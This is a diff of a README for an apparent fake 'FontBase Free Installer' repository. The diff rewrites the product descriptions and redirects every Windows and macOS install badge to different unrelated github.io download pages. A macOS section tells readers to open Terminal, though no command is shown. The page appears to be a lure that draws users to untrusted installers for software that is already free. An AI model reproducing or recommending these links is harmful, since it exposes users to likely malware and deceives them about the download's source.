@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Font+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 FontBase Free Installer** — FontBase is a free font manager for Windows, macOS, and Linux that helps designers organize and activate fonts without installing them permanently. Works without internet access, no account required. Full offline installation.
+**💻 FontBase Free Installer** — FontBase is a free font manager for Windows, macOS, and Linux that organizes and activates fonts without installing them system-wide. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FontBase](https://img.shields.io/badge/⬇_Install_FontBase-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install FontBase](https://img.shields.io/badge/⬇_Install_FontBase-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About FontBase
 
-FontBase is a free font manager for Windows, macOS, and Linux that helps designers organize and activate fonts without installing them permanently. Browse your font collection with live previews, organize fonts into collections, and activate only the fonts you need for each project. FontBase's non-destructive activation approach keeps your system clean while providing instant access to thousands of fonts.
+FontBase is a free font manager for Windows, macOS, and Linux that organizes and activates fonts without installing them system-wide. It supports Google Fonts sync, collections, tagging, and a clean visual preview interface for browsing large font libraries.
 
 ---
 
 ## ❌ Problem: FontBase is hard to access
 
-- **Performance with Large Libraries** — Thousands of fonts can slow down preview rendering
-- **Cloud Sync Premium** — Cross-device sync requires paid subscription
-- **Activation Dependency** — Fonts must be activated in FontBase before use in apps
-- **Limited Editing** — Management only; no font editing capabilities
+- **Paid for Pro Features** — Cloud sync and some management features require paid plan
+- **Performance on Large Libraries** — Slow with extremely large font collections (10,000+)
+- **No Editing** — Font viewer and manager only; cannot edit font files
+- **Internet Required for Google Fonts** — Google Fonts library sync requires internet
 
 ---
 
@@ -61,9 +61,9 @@ FontBase is a free font manager for Windows, macOS, and Linux that helps designe
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ FontBase is a free font manager for Windows, macOS, and Linux that helps designe
 
 <div align="center">
 
-[![⬇ Install FontBase](https://img.shields.io/badge/⬇_Install_FontBase-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install FontBase](https://img.shields.io/badge/⬇_Install_FontBase-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ FontBase is a free font manager for Windows, macOS, and Linux that helps designe
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ FontBase is a free font manager for Windows, macOS, and Linux that helps designe
 
 ---
 
-**FontBase Free Installer** — FontBase is a free font manager for Windows, macOS, and Linux that helps designers organize and activate fonts without installing them permanently. Install without internet connection today!
+**FontBase Free Installer** — FontBase is a free font manager for Windows, macOS, and Linux that organizes and activates fonts without installing them system-wide. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install FontBase](https://img.shields.io/badge/⬇_Install_FontBase-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install FontBase](https://img.shields.io/badge/⬇_Install_FontBase-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
